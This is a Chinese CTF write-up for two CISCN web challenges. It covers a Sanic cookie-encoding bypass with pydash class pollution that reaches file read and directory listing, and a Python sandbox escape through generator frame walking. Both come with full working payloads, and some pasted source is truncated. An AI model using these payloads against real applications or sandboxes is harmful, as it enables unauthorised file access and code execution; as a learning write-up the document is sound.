# CISCN 
## WEB
主要写的是新学到的两个知识点涉及到的两个题，分别是Python原型链污染，以及python栈帧沙箱逃逸。
### sanic
`/src`扫描下载源码。
```python
from sanic import Sanic
from sanic.response import text, html
from sanic_session import Session
import pydash
# pydash==5.1.2
class Pollute:
    def __init__(self):
pass
app = Sanic(__name__)
app.static("/static/", "./static/")
Session(app)
@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())
@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")
    return text("login fail")
@app.route("/src")
async def src(request):
    return text(open(__file__).read())
@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")
    return text("forbidden")
if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
首先这里是一个`cookie`要绕过一下，`;`会直接截断，用八进制绕过一下，这里绕过主要是基于RFC2068的编码规则。没找到太好的资料，贴一下我参考的wp的资料
```
Many HTTP/1.1 header field values consist of words separated by LWS
or special characters. These special characters MUST be in a quoted
string to be used within a parameter value.
These quoting routines conform to the RFC2109 specification, which in
turn references the character definitions from RFC2068.  They provide
a two-way quoting algorithm.  Any non-text character is translated
into a 4 character sequence: a forward-slash followed by the
three-digit octal equivalent of the character.  Any '\' or '"' is
quoted with a preceeding '\' slash.
Check for special sequences.  Examples:
   \012 --> \n
\" -->"
```
简而言之就是http/1.1编码要用`/`加三位八进制编码可以进行绕过。
源码标注了pydash的版本，以及根据后面的函数可以进行原型链污染。
```python
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")
    return text("forbidden")
```
这里过滤了`_.`可以用`\\\\.__init__\\\\.__globals__\\\\ `的形式绕过
```pyhton
@app.route("/src")
async def src(request):
    return text(open(__file__).read())
```
/src路由可以进行文件读取，我们可以对这个进行污染
`data = {"key": "__class__\\\\.__init__\\\\.__globals__\\\\.__file__", "value":
'/flag"}`
可以读取，但是这里文件不在根目录下，需要找flag的位置。
[具体查找过程](https://www.cnblogs.com/gxngxngxn/p/18205235)
污染exp:
`{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": True}
`
可以看到flag位置，再利用上文去读flag。
### mossfern
一个在线运行的网站，做了一些过滤
源码如下
```python
from sys import exit
from builtins import print
from dis import dis
from builtins import str
from io import StringIO
from sys import addaudithook
from contextlib import redirect_stdout
from random import randint, randrange, seed
from time import time
import os
def source_simple_check(source):
    """
检查源码中是否包含危险字符串，使用纯字符串查找 :param source: 源码
:return: None
"""
    try:
        source.encode("ascii")
except UnicodeEncodeError: print("不允许使用非 ASCII 字符") exit()
    for i in ["__", "getattr", "exit"]:
        if i in source.lower():
            print(i)
            exit()
def block_wrapper():
    """
使用 sys.audithook 检查运行进程，禁止进行危险操作 :return: None
"""
    def audit(event, args):
        for i in ["marshal", "__new__", "process", "os", "sys", "interpreter", "cpython", "open",
            if i in (event + "".join(str(s) for s in args)).lower():
                print(i)
os._exit(1) # 会直接将python程序终止，之后的所有代码都不会继续执行。 return audit
def source_opcode_checker(code):
    """
检查源码的字节码方面，禁止加载方法和全局变量 :param code: 源码
:return: None
"""
    opcodeIO = StringIO()
    dis(code, file=opcodeIO)
    opcode = opcodeIO.getvalue().split("\n")
    opcodeIO.close()
    for line in opcode:
        if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
            if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):

main.py
break
            print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(l
            exit()
if __name__ == "__main__":
source = open(f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt", "r").read() source_simple_check(source) # 函数用于设置审计钩子，监控运行进程，当事件或参数中包含特定危险关键词 source_opcode_checker(source) # 函数用于检查源码的字节码，禁止加载特定的方法和全局变量，以防止执行 code = compile(source, "<sandbox>", "exec")
addaudithook(block_wrapper())
outputIO = StringIO()
with redirect_stdout(outputIO):
        seed(str(time()) + "THIS_IS_SEED" + str(time()))
        exec(code, {
            "__builtins__": None,
            "randint": randint,
            "randrange": randrange,
            "seed": seed,
            "print": print
        }, None)
    output = outputIO.getvalue()
if "THIS_IS_SEED" in output:
print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住!") print("bad code-operation why still happened ah?")
    else:
        print(output)
```
```python 
import os
import subprocess
from flask import Flask, request, jsonify
from uuid import uuid1
app = Flask(__name__)
runner = open("/app/runner.py", "r", encoding="UTF-8").read()
flag = open("/flag", "r", encoding="UTF-8").readline().strip()
@app.post("/run")
def run():
    id = str(uuid1())
    try:
# 生成一个基于时间的唯一 ID。
# 获取 POST 请求中的 JSON 数据，从中获取键为 "code" 的值作为用户提交的 Python 代码。
# 将用户提交的代码写入到以 ID 命名的 .py 文件中，同时替换其中的特殊字符串为之前读取的 flag 和 ID。
        data = request.json
        open(f"/app/uploads/{id}.py", "w", encoding="UTF-8").write(
            runner.replace("THIS_IS_SEED", flag).replace("THIS_IS_TASK_RANDOM_ID", id))
        open(f"/app/uploads/{id}.txt", "w", encoding="UTF-8").write(data.get("code", ""))
        run = subprocess.run(
['python', f"/app/uploads/{id}.py"],
# 使用 subprocess.run 执行用户提交的代码，限定执行时间为 3 秒，并捕获标准输出和错误输出。将 stdout=subprocess.PIPE,
stderr=subprocess.PIPE,
timeout=3
        )
        result = run.stdout.decode("utf-8")
        error = run.stderr.decode("utf-8")
        print(result, error)
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": f"{result}\n{error}"
        })
    except:
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": "None"
        })
if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```
这个函数是很明显的 Python利用栈帧沙箱逃逸 
```python
exec(code, {
            "__builtins__": None,
            "randint": randint,
            "randrange": randrange,
            "seed": seed,
            "print": print
        }, None)
```
贴一下exp:

```python
def getflag():
    def f():
        yield g.gi_frame.f_back
    g = f()
    frame=[x for x in g][0]
    gattr = frame.f_back.f_back.f_back.f_locals['_'+'_builtins_'+'_']
    code = frame.f_back.f_back.f_back.f_code
    gattr_dir = gattr.dir
    s  = gattr.str
    print(gattr_dir(code))
    for i in s(code.co_consts):
        print(i,end=",")
getflag()
```



